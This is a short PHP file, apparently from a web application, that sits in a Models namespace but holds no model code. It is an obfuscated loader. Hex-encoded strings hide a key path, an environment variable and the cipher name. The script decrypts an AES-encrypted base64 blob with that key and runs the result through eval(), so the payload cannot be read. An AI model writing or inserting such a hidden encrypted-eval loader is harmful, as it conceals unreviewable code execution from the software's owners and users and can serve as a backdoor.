<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('8Cfz2/991MkMEBFRQO4tKw==');

$c=base64_decode(

'BF8nct7S7pY/4JIFoPKjxCG1wSyocv1kxij/ikVmeIr9xbZFeoYal27u0TApN48PUjxpklCelvGE' .
'DYaNR2pTDGsI2OgENul31hF1G6k8H4dQZjO6xSkcimvAS5GdCicIVzcoOuKME3cDooHLe8VxIZQl' .
'W3jUDEIRqSWuY15EH/XOTLQ07KFApRvIvtMLKUsbkXfUtwaExhHuKd2vl171k0SwgpUCJFnPi16u' .
'9/bFdsLRt/8bREo4sZ02U5mgeiy5ipRgCYlmL5hcRZLa6LMzZDfoHcQ8bRR+lKCUyhHlg4GU3tD2' .
'NdrQxXbdA4KUrpaIWGQtmcMx5EHzXrXg+u91sagiyjMJ6abz18Jf14o+KfUUAt9lQH71I3d3txbK' .
'OqWrRgIIR/rlVIlqqkIryYT7Ywv1whQH0NT9nOWC5+MyXtM2IF33/60z3XaP3yG/3McmyZpJ9rkz' .
'ObeBQSTt7vTkCZYFGQDUdNCSVD+V6NG8ZoRg3asi+ZWXTCupjUYN0RY6J6ITFzrgqY7UgISqLxS4' .
'DN2rkZxloqbVMCppzYCBmv1NpQMQtHZP3WU3WFzKMnAKWw8UOL9IQMjNBA0Zmvg9wERPyRO65FP+' .
'9X96Kf/5hDWBq3v31bTrfXSDoXSfAN+DM8boQgQBKm77poSlh5rAUpqJPeBrFqTEiHoSPuM2jh43' .
'VtQzW+aDIopwqhinsHGMdLjXnexPxyzuQePBIPvsJIG8HWPHa/hQk4YOe3BYPOu+SrM+xszZXdSu' .
'tsNAHxUu+3Ayx4gtIy3XDfdOl86E2ovEZ0uy7Ksnm/UnnE1BrdBRxAfJNDsViecm3uLGX4oSwAQU' .
'apnuDsWhR9tXHqsZGGfWCSvROBFbUE3YJQ7ViLJVGLY1GvpleLqplFOiSmxlIOUku24Jt6sQATZu' .
'hpasiMv5uFAF58Gg9knoDKc4vM4w4/PnnHXCmO1Zd9VJu25LgchacFI7IX1EI8wCWk2pNQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

